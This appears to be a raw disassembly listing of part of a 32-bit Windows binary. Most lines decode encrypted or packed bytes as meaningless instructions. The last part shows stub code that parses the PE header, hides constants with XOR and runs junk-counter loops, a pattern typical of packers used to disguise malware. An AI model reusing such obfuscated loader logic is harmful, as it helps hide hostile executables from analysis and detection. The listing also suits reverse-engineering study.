  417846:	ds xor ah,ch
  417849:	sbb    DWORD PTR [ebx-0x27d9bbb2],ecx
  41784f:	in     eax,dx
  417850:	mov    bl,0x10
  417852:	jae    0x417850
  417854:	js     0x41789d
  417856:	loop   0x4178b5
  417858:	jecxz  0x417877
  41785a:	out    0xfe,al
  41785c:	int3   
  41785d:	inc    edi
  41785e:	fwait
  41785f:	cmp    al,0x5c
  417861:	call   0xf8c6:0x8e2069f3
  417868:	gs int 0xd4
  41786b:	pop    ss
  41786c:	fisttp WORD PTR [edi+0x6]
  41786f:	rcl    DWORD PTR [edi+eax*1],1
  417872:	sbb    BYTE PTR [esi+0x23266089],0xb9
  417879:	pop    ss
  41787a:	enter  0x266d,0xf7
  41787e:	pop    ss
  41787f:	ret    0xb4e5
  417882:	or     esp,edi
  417884:	(bad)  
  417885:	mov    edx,0x592a35db
  41788a:	out    0xaa,eax
  41788c:	mov    ds:0x2db4a663,al
  417891:	dec    eax
  417892:	sbb    eax,0x23f5f7d2
  417897:	mov    dh,0x6d
  417899:	ret    0x6c7c
  41789c:	mov    BYTE PTR [ebp-0x5167d1ea],bl
  4178a2:	xchg   ebp,eax
  4178a3:	and    BYTE PTR [ebp-0x7e],dh
  4178a6:	cwde   
  4178a7:	outs   dx,DWORD PTR ds:[esi]
  4178a8:	inc    esi
  4178a9:	sub    DWORD PTR [ebx+0x5b4e7520],edx
  4178af:	push   edx
  4178b0:	sbb    al,0xe1
  4178b2:	mov    WORD PTR [edx+0x57],fs
  4178b5:	imul   esp,DWORD PTR [esi+0x1b],0xcb732bea
  4178bc:	out    0xe5,al
  4178be:	jbe    0x41789c
  4178c0:	jns    0x417912
  4178c2:	bnd je 0x4178e8
  4178c5:	sub    BYTE PTR [ecx-0x6b7fd4ab],ch
  4178cb:	adc    bl,BYTE PTR [eax+0x32]
  4178ce:	cmp    eax,0xb49c878b
  4178d3:	aaa    
  4178d4:	lds    edx,FWORD PTR [esi]
  4178d6:	jb     0x417897
  4178d8:	(bad)  
  4178d9:	mov    ebp,edi
  4178db:	jmp    0x417904
  4178dd:	pop    ebx
  4178de:	sti    
  4178df:	adc    eax,0x4f8a9c6d
  4178e4:	test   esi,esp
  4178e6:	dec    ebp
  4178e7:	sub    BYTE PTR [ecx-0x3f],0x20
  4178eb:	xchg   esp,eax
  4178ec:	inc    esp
  4178ed:	mov    ecx,0xd8dd415f
  4178f2:	(bad)  
  4178f3:	scas   al,BYTE PTR es:[edi]
  4178f4:	sbb    al,BYTE PTR [esi]
  4178f6:	lods   al,BYTE PTR ds:[esi]
  4178f7:	scas   eax,DWORD PTR es:[edi]
  4178f8:	jb     0x417896
  4178fa:	or     BYTE PTR [ebx+0x7dca8092],ah
  417900:	call   0x463f:0x30d97e9e
  417907:	idiv   BYTE PTR [eax+edi*2+0x1344ba6f]
  41790e:	nop
  41790f:	(bad)  
  417910:	or     al,0xd8
  417912:	adc    al,BYTE PTR [edx-0x55]
  417915:	and    ebx,esp
  417917:	inc    esp
  417918:	cld    
  417919:	test   al,0x63
  41791b:	add    BYTE PTR [esi-0x48],0xe5
  41791f:	jae    0x41792e
  417921:	or     esi,DWORD PTR [ebp+0x6d]
  417924:	and    ebp,DWORD PTR [edx]
  417926:	jno    0x417995
  417928:	or     DWORD PTR [ecx],ebx
  41792a:	outs   dx,DWORD PTR ds:[esi]
  41792b:	ficomp WORD PTR [ecx-0xe]
  41792e:	imul   bp,WORD PTR [edx],0x3e20
  417933:	das    
  417934:	pop    esp
  417935:	les    esp,FWORD PTR [esi]
  417937:	jp     0x4178f6
  417939:	mov    dl,0xb3
  41793b:	out    0x75,eax
  41793d:	fisttp QWORD PTR [eax]
  41793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417940:	push   ecx
  417941:	test   bl,ch
  417943:	sbb    eax,0x27a74429
  417948:	out    0xb5,eax
  41794a:	jae    0x417975
  41794c:	mov    cl,BYTE PTR [edi]
  41794e:	or     bh,dl
  417950:	push   0xfeda308c
  417955:	scas   eax,DWORD PTR es:[edi]
  417956:	(bad)  
  417957:	sub    DWORD PTR [ecx-0x124df026],esi
  41795d:	xchg   ebx,eax
  41795e:	push   es
  41795f:	inc    eax
  417960:	popa   
  417961:	fisttp DWORD PTR [ecx]
  417963:	inc    ecx
  417964:	or     al,0xf8
  417966:	popa   
  417967:	mov    ebx,0x4f1514ad
  41796c:	(bad)  
  41796e:	(bad)  
  417970:	push   esp
  417971:	mov    eax,ds:0x5259aef3
  417976:	bound  ecx,QWORD PTR [ebp+0x1268d702]
  41797c:	stos   BYTE PTR es:[di],al
  41797e:	pop    esi
  41797f:	push   ebx
  417980:	sub    DWORD PTR [edx+eax*4],esp
  417983:	aam    0x52
  417985:	mov    eax,ds:0x2c7c55c0
  41798a:	imul   ebp,DWORD PTR [ecx+0x53c7df54],0x2c05487e
  417994:	add    bh,BYTE PTR [edi+0x1e]
  417997:	xor    DWORD PTR [ebx],ebx
  417999:	jl     0x417a1a
  41799b:	es push ecx
  41799d:	outs   dx,DWORD PTR ds:[esi]
  41799e:	fwait
  41799f:	add    eax,0xaf57327e
  4179a4:	fiadd  DWORD PTR [eax+edi*4-0x48]
  4179a8:	inc    esp
  4179a9:	adc    DWORD PTR [eax],edx
  4179ab:	dec    ebx
  4179ac:	stos   DWORD PTR es:[edi],eax
  4179ad:	dec    esi
  4179ae:	inc    esp
  4179af:	popa   
  4179b0:	stc    
  4179b1:	outs   dx,DWORD PTR ds:[esi]
  4179b2:	mov    bl,0x8d
  4179b4:	push   edx
  4179b5:	cmp    al,0x11
  4179b7:	pop    ecx
  4179b8:	rol    BYTE PTR [esi],1
  4179ba:	aam    0xcb
  4179bc:	or     ch,BYTE PTR [edx-0x32]
  4179bf:	jnp    0x417987
  4179c1:	dec    eax
  4179c2:	xor    dh,BYTE PTR [eax]
  4179c4:	test   DWORD PTR [eax],0xa05c8df0
  4179ca:	cdq    
  4179cb:	ds mov eax,0x11b14467
  4179d1:	jns    0x4179c7
  4179d3:	out    0x47,al
  4179d5:	cmp    bl,ch
  4179d7:	rcl    DWORD PTR [edi-0x593b370f],cl
  4179dd:	pushf  
  4179de:	sub    ch,BYTE PTR [edi+0x67]
  4179e1:	retf   0x7783
  4179e4:	pop    esi
  4179e5:	xchg   ebp,eax
  4179e6:	and    DWORD PTR [ecx-0x4ea5fc45],ebp
  4179ec:	scas   eax,DWORD PTR es:[edi]
  4179ed:	ret    
  4179ee:	call   0x96bf:0xac87461d
  4179f5:	mov    al,ds:0x8d288b57
  4179fa:	inc    esp
  4179fb:	pop    ebx
  4179fc:	pushf  
  4179fd:	mov    ebp,edx
  4179ff:	cdq    
  417a00:	scas   eax,DWORD PTR es:[edi]
  417a01:	mov    ds:0x295ae8aa,eax
  417a06:	dec    ebp
  417a07:	(bad)
  417a0a:	imul   esp,ebx,0xffffff8f
  417a0d:	jne    0x4179d0
  417a0f:	(bad)  
  417a10:	pop    ecx
  417a11:	aaa    
  417a12:	test   DWORD PTR [edi+0x2c1b8869],ecx
  417a18:	(bad)  
  417a1a:	lock mov dl,0xf2
  417a1d:	fistp  QWORD PTR [ecx]
  417a1f:	adc    al,0xb2
  417a21:	lds    edi,FWORD PTR [edi+0x3e134d6]
  417a27:	ret    0x4edc
  417a2a:	xor    al,0xe
  417a2c:	xor    ebx,DWORD PTR [esi+0x58]
  417a2f:	icebp  
  417a30:	cwde   
  417a31:	inc    edi
  417a32:	dec    eax
  417a33:	mov    bh,0x6d
  417a35:	pop    es
  417a36:	fyl2xp1 
  417a38:	scas   al,BYTE PTR es:[edi]
  417a39:	xchg   DWORD PTR [esi+0x5578c0de],esi
  417a3f:	jg     0x4179c9
  417a41:	adc    DWORD PTR [edi+0x5],ecx
  417a44:	jl     0x417a07
  417a46:	jns    0x417a2e
  417a48:	add    al,0xe5
  417a4a:	int    0x6d
  417a4c:	int    0xe
  417a4e:	iret   
  417a4f:	cmp    eax,0x853a88b0
  417a54:	and    ah,BYTE PTR [ebx-0x46]
  417a57:	pusha  
  417a58:	inc    eax
  417a59:	jl     0x417a56
  417a5b:	and    al,0xdc
  417a5d:	xor    al,0xc2
  417a5f:	ret    0x8f91
  417a62:	mov    DWORD PTR [edi+0x3cd9b0e],edi
  417a68:	cmc    
  417a69:	repnz (bad) 
  417a6c:	mov    BYTE PTR [ecx],ch
  417a6e:	jns    0x417a80
  417a70:	outs   dx,DWORD PTR ds:[esi]
  417a71:	add    dl,ah
  417a73:	imul   edi,DWORD PTR [ecx+0x33],0x7a
  417a77:	retf   0x7f0d
  417a7a:	daa    
  417a7b:	int    0xcc
  417a7d:	ins    DWORD PTR es:[edi],dx
  417a7e:	sub    BYTE PTR [edi+0x1c],0xf
  417a82:	cmp    al,0xc2
  417a84:	out    dx,al
  417a85:	xlat   BYTE PTR ds:[ebx]
  417a86:	std    
  417a87:	aas    
  417a88:	inc    DWORD PTR [ebp+0x69]
  417a8b:	imul   esi,DWORD PTR [eax+0x7e],0x4c8cade
  417a92:	lock mov ecx,0x7427737
  417a98:	aam    0xb
  417a9a:	push   edx
  417a9b:	add    BYTE PTR [ebx-0x62],dl
  417a9e:	mov    ds:0xf79fb3f0,eax
  417aa3:	xchg   esp,eax
  417aa4:	jo     0x417aba
  417aa6:	fldcw  WORD PTR [edi-0x49c826d4]
  417aac:	mov    edx,0x6fde31e8
  417ab1:	ss xchg esi,eax
  417ab3:	or     eax,0x52c801be
  417ab8:	jmp    0x6ad:0x338ac393
  417abf:	jo     0x417b2a
  417ac1:	or     al,0x57
  417ac3:	nop
  417ac4:	sbb    ebp,esp
  417ac6:	dec    ebp
  417ac7:	jns    0x417aa7
  417ac9:	fisttp QWORD PTR [ebp+0x2a165f64]
  417acf:	bound  ebx,QWORD PTR [ebx]
  417ad1:	aad    0x1
  417ad3:	mov    cl,0xf9
  417ad5:	xchg   bl,dh
  417ad7:	lods   al,BYTE PTR ds:[esi]
  417ad8:	inc    edx
  417ad9:	addr16 sti 
  417adb:	leave  
  417adc:	dec    ecx
  417add:	ror    edi,0xad
  417ae0:	mov    WORD PTR [eax+0x17],?
  417ae3:	jbe    0x417a88
  417ae5:	sbb    DWORD PTR [ebp-0x5ec288e8],0x420bafb2
  417aef:	test   eax,0x818708b2
  417af4:	lock mov esi,0x9917e02d
  417afa:	shl    DWORD PTR [esi],cl
  417afc:	mov    eax,0x5073d8dc
  417b01:	scas   eax,DWORD PTR es:[edi]
  417b02:	dec    ebp
  417b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b04:	aad    0x46
  417b06:	aad    0x4a
  417b08:	rcl    DWORD PTR [esi+0x3b82ff7a],1
  417b0e:	cmp    DWORD PTR [ecx-0x5cb418e8],eax
  417b14:	(bad)  
  417b16:	mov    WORD PTR [ecx],gs
  417b18:	retf   0x85c8
  417b1b:	sub    BYTE PTR ds:0xf96203af,bh
  417b21:	gs jg  0x417b3e
  417b24:	rcr    DWORD PTR [edi],cl
  417b26:	add    ch,dh
  417b28:	js     0x417b51
  417b2a:	sar    BYTE PTR [eax+0x38],0xb0
  417b2e:	aaa    
  417b2f:	dec    ebp
  417b30:	mov    al,ds:0x14fbd4a1
  417b35:	mov    ebx,0x9a3ce507
  417b3a:	idiv   DWORD PTR [ebx+eax*4+0x7228bdde]
  417b41:	cmp    esi,DWORD PTR [esi+0x10]
  417b44:	fwait
  417b45:	call   0x9cbb2b64
  417b4a:	dec    ecx
  417b4b:	in     eax,dx
  417b4c:	outs   dx,BYTE PTR ds:[esi]
  417b4d:	outs   dx,BYTE PTR ds:[esi]
  417b4e:	mov    al,ds:0xc4e1ddb0
  417b53:	cmp    ecx,DWORD PTR [ebx+0x768acf90]
  417b59:	dec    ebp
  417b5a:	imul   eax,esp,0x18d7337
  417b60:	pop    esp
  417b61:	xchg   edx,eax
  417b62:	sbb    DWORD PTR [ebx+0x76],ebp
  417b65:	in     al,dx
  417b66:	push   esp
  417b67:	stos   BYTE PTR es:[edi],al
  417b68:	adc    eax,0x2270dac4
  417b6d:	fnstenv [esp-0x55]
  417b71:	arpl   WORD PTR [ecx+0x64580a8c],bp
  417b77:	push   esp
  417b78:	popf   
  417b79:	ret    
  417b7a:	cmp    ah,BYTE PTR [edi]
  417b7c:	sbb    ebp,DWORD PTR [edi+edi*2+0x7e]
  417b80:	sub    BYTE PTR [ecx+0x4b],dh
  417b83:	lock xor esp,DWORD PTR [eax]
  417b86:	imul   BYTE PTR [eax+0x2a]
  417b89:	retf   0xbbc3
  417b8c:	lods   al,BYTE PTR ds:[esi]
  417b8d:	push   edi
  417b8e:	fisttp WORD PTR ss:[ebx+0x586d7ce9]
  417b95:	and    cl,ah
  417b97:	add    al,al
  417b99:	(bad)  
  417b9a:	lds    eax,FWORD PTR [esi]
  417b9c:	push   ss
  417b9d:	div    BYTE PTR fs:[ecx]
  417ba0:	xchg   ecx,eax
  417ba1:	dec    eax
  417ba2:	push   eax
  417ba3:	iret   
  417ba4:	and    ebp,DWORD PTR [edx+0x5d]
  417ba7:	xchg   ecx,eax
  417ba8:	rol    BYTE PTR [edi+0x6129862f],cl
  417bae:	mov    cl,0x2b
  417bb0:	mov    dl,0x98
  417bb2:	xor    ecx,DWORD PTR [ebx-0x7f06f540]
  417bb8:	sub    ecx,DWORD PTR [ebx]
  417bba:	mov    ds:0x3126f4e4,eax
  417bbf:	inc    edi
  417bc0:	bound  ebp,QWORD PTR [edi]
  417bc2:	in     al,0xb9
  417bc4:	gs mov ah,0x21
  417bc7:	test   DWORD PTR [esi+0x6d],0xdd75e036
  417bce:	scas   al,BYTE PTR es:[edi]
  417bcf:	js     0x417b74
  417bd1:	xchg   esp,eax
  417bd2:	test   al,0x95
  417bd4:	mov    ch,0xdb
  417bd6:	mov    al,ds:0x64d9ef0a
  417bdb:	not    DWORD PTR [eax]
  417bdd:	nop
  417bde:	mov    eax,0xe089df0b
  417be3:	push   ss
  417be4:	es inc edx
  417be6:	fadd   DWORD PTR [ecx+edi*8]
  417be9:	rcr    BYTE PTR [ebx-0x10fb46fb],cl
  417bef:	pop    edx
  417bf0:	mov    ebp,0xbee08e85
  417bf5:	retf   
  417bf6:	hlt    
  417bf7:	push   ebp
  417bf8:	in     eax,dx
  417bf9:	retf   
  417bfa:	xchg   DWORD PTR [eax+0x63],eax
  417bfd:	adc    DWORD PTR [edi],edi
  417bff:	mov    ah,0xf5
  417c01:	pop    edi
  417c02:	fwait
  417c03:	bound  ecx,QWORD PTR [edi-0x289b4d82]
  417c09:	in     al,0x8a
  417c0b:	ror    DWORD PTR [ecx-0x37561cf2],1
  417c11:	adc    esi,esi
  417c13:	cmp    DWORD PTR [ecx-0x35c5aa77],ebp
  417c19:	sar    DWORD PTR [eax-0x28],0x79
  417c1d:	add    BYTE PTR [edx-0x4df61ba5],cl
  417c23:	or     dl,BYTE PTR [esi+0x3f883409]
  417c29:	dec    edi
  417c2a:	cvtps2pd xmm4,QWORD PTR [ecx-0x1e7c39fd]
  417c31:	pop    ebp
  417c32:	pop    edx
  417c33:	cmp    eax,0xa480c708
  417c38:	mov    edx,0x783f6934
  417c3d:	cmp    ch,BYTE PTR [eax+esi*2]
  417c40:	jbe    0x417cbb
  417c42:	test   BYTE PTR [eax+0x65],dh
  417c45:	mov    cl,0xf0
  417c47:	retf   
  417c48:	loop   0x417c3a
  417c4a:	mov    dh,0x7d
  417c4c:	mov    DWORD PTR [ecx],esi
  417c4e:	rol    BYTE PTR [edx],cl
  417c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c51:	stc    
  417c52:	ffree  st(5)
  417c54:	mov    al,ds:0xd787846
  417c59:	xor    edx,DWORD PTR [ecx]
  417c5b:	add    al,0x7c
  417c5d:	inc    ecx
  417c5e:	mov    ebx,0x5b46b4b5
  417c63:	mov    ch,0x38
  417c66:	mov    dl,0x1a
  417c68:	jge    0x417bf6
  417c6a:	out    0x65,eax
  417c6c:	mov    edi,0x5f7267d5
  417c71:	aas    
  417c72:	jae    0x417bf4
  417c74:	and    eax,0x4607e4e
  417c79:	(bad)  
  417c7a:	jbe    0x417ca5
  417c7c:	hlt    
  417c7d:	rol    BYTE PTR [edi],1
  417c7f:	test   BYTE PTR [esi],ch
  417c81:	(bad)  
  417c82:	mov    ds:0x26f15507,al
  417c87:	jmp    0x417caf
  417c89:	lea    ecx,[ecx]
  417c8b:	retf   
  417c8c:	inc    esp
  417c8d:	shl    DWORD PTR [edx+0x795debff],1
  417c93:	popa   
  417c94:	mov    ecx,0x48871cd2
  417c99:	stos   BYTE PTR es:[edi],al
  417c9a:	pop    eax
  417c9b:	mov    ecx,ebp
  417c9d:	push   edi
  417c9e:	sub    al,dl
  417ca0:	dec    ebp
  417ca1:	enter  0xdea3,0xc5
  417ca5:	push   0x307f7df8
  417caa:	mov    edi,0x9a17d93c
  417caf:	sub    ch,0xb9
  417cb2:	ret    0x1883
  417cb5:	dec    edi
  417cb6:	pop    es
  417cb7:	add    al,0x65
  417cb9:	hlt    
  417cba:	sub    edi,DWORD PTR [ecx+0x3e]
  417cbd:	inc    eax
  417cbe:	sub    al,0x34
  417cc0:	push   esp
  417cc1:	dec    edi
  417cc2:	xchg   edi,eax
  417cc3:	fimul  DWORD PTR [edi-0x63dd1004]
  417cc9:	xor    esi,DWORD PTR [edx-0x584b7342]
  417ccf:	in     eax,dx
  417cd0:	shl    DWORD PTR [edx],0xb2
  417cd3:	les    ecx,FWORD PTR [eax+0x269bf026]
  417cd9:	inc    esi
  417cda:	sar    edx,1
  417cdc:	in     al,dx
  417cdd:	dec    edi
  417cde:	es or  eax,0xde9af3b2
  417ce4:	adc    ebp,edi
  417ce6:	leave  
  417ce7:	popf   
  417ce8:	(bad)  
  417cea:	mov    ebp,edx
  417cec:	je     0x417cf9
  417cee:	ds test cl,al
  417cf1:	cmp    ecx,edx
  417cf3:	neg    BYTE PTR [edi]
  417cf5:	pop    edi
  417cf6:	jmp    DWORD PTR cs:[esi+edi*2+0x41]
  417cfb:	and    eax,0xe24fe857
  417d00:	fidivr WORD PTR [eax-0x32]
  417d03:	pushf  
  417d04:	adc    esp,DWORD PTR [ebx]
  417d06:	hlt    
  417d07:	dec    BYTE PTR [ebx-0x547d750e]
  417d0d:	dec    eax
  417d0e:	(bad)  
  417d0f:	(bad)  
  417d10:	fiadd  WORD PTR [ecx+0x3b]
  417d13:	sbb    dl,BYTE PTR [esi]
  417d15:	jbe    0x417d89
  417d17:	inc    ebp
  417d18:	daa    
  417d19:	jmp    0x7feb:0x91c8dd1d
  417d20:	pop    eax
  417d21:	out    0x52,eax
  417d23:	pop    edx
  417d24:	(bad)  
  417d25:	or     BYTE PTR [edx-0x76c79cbf],al
  417d2b:	mov    ebx,0x5dd7bf0
  417d30:	dec    edi
  417d31:	cli    
  417d32:	or     DWORD PTR [esi],esp
  417d34:	pop    ecx
  417d35:	dec    esp
  417d36:	out    0x32,eax
  417d38:	xchg   esp,eax
  417d39:	xor    al,0x7a
  417d3b:	push   cs
  417d3c:	jmp    0x1db2:0x20aea9d8
  417d43:	inc    edx
  417d44:	xchg   esp,eax
  417d45:	adc    eax,DWORD PTR [esi-0x71466412]
  417d4b:	call   0x62b13388
  417d50:	cmc    
  417d51:	xchg   ebp,eax
  417d52:	and    BYTE PTR [ecx],bl
  417d54:	repnz cmc 
  417d56:	clc    
  417d57:	inc    ebp
  417d58:	dec    esp
  417d59:	or     eax,0xdd46cb49
  417d5e:	mov    WORD PTR [edi+0x5aa83ed3],es
  417d64:	fidivr DWORD PTR [edi-0x383aa20]
  417d6a:	pop    edi
  417d6b:	push   edx
  417d6c:	scas   eax,DWORD PTR es:[edi]
  417d6d:	xor    al,0xf8
  417d6f:	jge    0x417de3
  417d71:	in     eax,dx
  417d72:	mov    eax,ds:0xe689bbd8
  417d77:	adc    ebx,edi
  417d79:	arpl   dx,sp
  417d7b:	add    bh,BYTE PTR [ecx+0x76]
  417d7e:	sbb    al,0xe7
  417d80:	jl     0x417d6b
  417d82:	add    DWORD PTR [edx+0x4b],esi
  417d85:	jecxz  0x417da7
  417d87:	daa    
  417d88:	push   cs
  417d89:	jns    0x417d13
  417d8b:	je     0x417e02
  417d8d:	mov    ds:0xe7f5c4c8,al
  417d92:	fs nop
  417d94:	sbb    ch,BYTE PTR [edx-0x185bdf25]
  417d9a:	mov    bh,0x14
  417d9c:	popa   
  417d9d:	repnz in al,dx
  417d9f:	mov    bl,0x7b
  417da1:	out    0x42,al
  417da3:	addr16 loopne 0x417d81
  417da6:	call   0xd8060798
  417dab:	sub    ebx,eax
  417dad:	rcr    DWORD PTR [eax-0x74c1b015],cl
  417db3:	add    ebx,esi
  417db5:	jle    0x417d5a
  417db7:	pop    esp
  417db8:	fisttp QWORD PTR [ecx]
  417dba:	and    DWORD PTR [eax],0xd9e61e
  417dc0:	(bad)  
  417dc2:	sti    
  417dc3:	pushf  
  417dc4:	fstp   DWORD PTR [edi]
  417dc6:	stos   DWORD PTR es:[edi],eax
  417dc7:	test   al,0xa7
  417dc9:	rol    DWORD PTR [esi+0xf],0x28
  417dcd:	test   al,0xf8
  417dcf:	wrmsr  
  417dd1:	xchg   esi,eax
  417dd2:	add    esp,edi
  417dd4:	lods   al,BYTE PTR ds:[esi]
  417dd5:	jae    0x417e42
  417dd7:	sub    eax,0x5b2edece
  417ddc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ddd:	mov    edx,0x63670dc7
  417de2:	inc    edi
  417de3:	mov    ds:0xdccc7f84,al
  417de8:	sbb    BYTE PTR [ecx-0x2b],al
  417deb:	xor    DWORD PTR [ebx],ebp
  417ded:	sbb    BYTE PTR [ebx+0x27],bh
  417df0:	inc    ecx
  417df1:	or     eax,0xb7e2904
  417df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417df7:	fiadd  WORD PTR [edx-0x49bbd78d]
  417dfd:	jle    0x417e5d
  417dff:	(bad)  
  417e00:	fmul   QWORD PTR [eax+0x2f9d24f5]
  417e06:	in     al,dx
  417e07:	clc    
  417e08:	fwait
  417e09:	sbb    eax,0xa7b98341
  417e0e:	test   BYTE PTR [esi+edi*1+0x1dc8b947],0xda
  417e16:	scas   eax,DWORD PTR es:[edi]
  417e17:	cs jp  0x417e2a
  417e1a:	and    edx,edi
  417e1c:	xor    BYTE PTR [ebp+0x4c],ch
  417e1f:	cli    
  417e20:	call   0xf1f4f24c
  417e25:	fild   QWORD PTR [ecx]
  417e27:	popf   
  417e28:	out    dx,al
  417e29:	push   0xa65c48a2
  417e2e:	into   
  417e2f:	ss mov dl,0x79
  417e32:	or     esp,ebx
  417e34:	jge    0x417df3
  417e36:	or     esp,edx
  417e38:	outs   dx,BYTE PTR ds:[esi]
  417e39:	or     BYTE PTR [ecx-0x66],ch
  417e3c:	dec    eax
  417e3d:	out    dx,al
  417e3e:	mov    ds:0x95ce4416,eax
  417e43:	push   ecx
  417e44:	mov    ebx,0xe7d9a787
  417e49:	xor    DWORD PTR [edi+ecx*4],esi
  417e4c:	mov    ebx,DWORD PTR [ecx+0x6b]
  417e4f:	ret    0xca49
  417e52:	push   eax
  417e53:	dec    edx
  417e54:	enter  0x994b,0xa7
  417e58:	push   0x5d63d32e
  417e5d:	ret    
  417e5e:	xor    al,0x2
  417e60:	push   ebp
  417e61:	fucomip st,st(6)
  417e63:	cmp    al,0x10
  417e65:	sub    DWORD PTR [edx+0x32e10a66],edi
  417e6b:	jne    0x417dfe
  417e6d:	(bad)  
  417e6e:	lock in eax,0x33
  417e71:	pop    edi
  417e72:	xchg   BYTE PTR [edi+0x16],dl
  417e75:	nop
  417e76:	jecxz  0x417e06
  417e78:	stos   DWORD PTR es:[edi],eax
  417e79:	inc    edi
  417e7a:	pop    ecx
  417e7b:	out    dx,al
  417e7c:	pop    eax
  417e7d:	ins    BYTE PTR es:[edi],dx
  417e7e:	and    eax,ebp
  417e80:	lods   eax,DWORD PTR ds:[esi]
  417e81:	call   0xa223:0xda36765e
  417e88:	xor    al,0x84
  417e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e8b:	call   0x4dd1:0x3ef1664d
  417e92:	jno    0x417eb9
  417e94:	ins    BYTE PTR es:[edi],dx
  417e95:	nop
  417e96:	imul   edi,DWORD PTR [edi+0x1e],0x22b17425
  417e9d:	retf   
  417e9e:	jb     0x417ef0
  417ea0:	ins    BYTE PTR es:[edi],dx
  417ea1:	dec    esp
  417ea2:	mov    fs:0x258c7621,al
  417ea8:	xchg   ebp,eax
  417ea9:	or     ah,BYTE PTR [ebp-0x1743b43d]
  417eaf:	mov    eax,0x583d41c0
  417eb4:	popa   
  417eb5:	pop    es
  417eb6:	pop    esp
  417eb7:	ds iret 
  417eb9:	fstp   QWORD PTR [eax+edx*2-0x4d]
  417ebd:	aaa    
  417ebe:	rcl    BYTE PTR [ecx+ecx*8],cl
  417ec1:	push   0x25
  417ec3:	retf   
  417ec4:	sbb    ebp,ecx
  417ec6:	push   ecx
  417ec7:	popf   
  417ec8:	ret    
  417ec9:	dec    eax
  417eca:	xchg   edi,eax
  417ecb:	les    eax,FWORD PTR [ebp+0x53]
  417ece:	xchg   esi,eax
  417ecf:	ret    
  417ed0:	jmp    0x5ba4:0x9b464536
  417ed7:	xchg   esi,eax
  417ed8:	cmp    edi,edx
  417eda:	retf   
  417edb:	mov    al,0xe1
  417edd:	sbb    DWORD PTR [edx+0x48501fc4],ecx
  417ee3:	push   edx
  417ee4:	jb     0x417ed8
  417ee6:	xor    eax,0xb23e64d1
  417eeb:	jbe    0x417ef8
  417eed:	or     DWORD PTR [esi-0x1f096a5f],ebx
  417ef3:	push   eax
  417ef4:	enter  0xe091,0x4c
  417ef8:	adc    DWORD PTR [edx-0x1],esi
  417efb:	xchg   edi,eax
  417efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417efd:	shr    DWORD PTR [esi+0x29],1
  417f00:	cmp    DWORD PTR [edi+0x32df2394],ebp
  417f06:	push   esp
  417f07:	int    0x8c
  417f09:	cld    
  417f0a:	nop
  417f0b:	sbb    edi,DWORD PTR [edx+edi*2-0x3126acf3]
  417f12:	data16 test al,0x24
  417f15:	push   edx
  417f16:	ss pop ecx
  417f18:	(bad)  
  417f19:	scas   al,BYTE PTR es:[edi]
  417f1a:	loope  0x417f89
  417f1c:	xor    DWORD PTR [ecx+edx*4+0x61df14e],edi
  417f23:	(bad)  
  417f24:	mov    al,BYTE PTR [eax]
  417f26:	add    DWORD PTR ds:0x429004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
